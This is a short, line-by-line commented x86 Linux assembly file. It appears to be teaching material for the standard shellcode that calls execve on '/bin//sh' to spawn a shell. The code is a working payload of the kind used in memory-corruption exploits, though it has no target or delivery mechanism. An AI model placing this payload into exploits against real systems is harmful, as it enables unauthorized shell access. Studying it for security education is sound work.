.intel_syntax noprefix   # Intel syntax with no prefix for registers or instructions.

.section .text           # Text section: where executable code resides.
.global _start           # Define the _start symbol as the entry point for the code.

_start: 
    xor    eax, eax               # Clear eax register
    push   eax                    # Push null terminator
    push   0x68732f2f             # Push "//sh" onto the stack
    push   0x6e69622f             # Push "/bin" onto the stack
    mov    ebx, esp               # Set ebx to the top of the stack (pointer to "/bin//sh")

    xor eax, eax
    push eax
    push   ebx                    # Push pointer to "/bin//sh" for argv[0]
    mov    ecx, esp               # Set ecx to point to the argv array (argv)

    xor edx, edx
    
    # perform syscall for 11 (execve)
    mov    al, 0xb                # Set eax to 11 (execve syscall number)
    int    0x80                   # Trigger interrupt to make the syscall
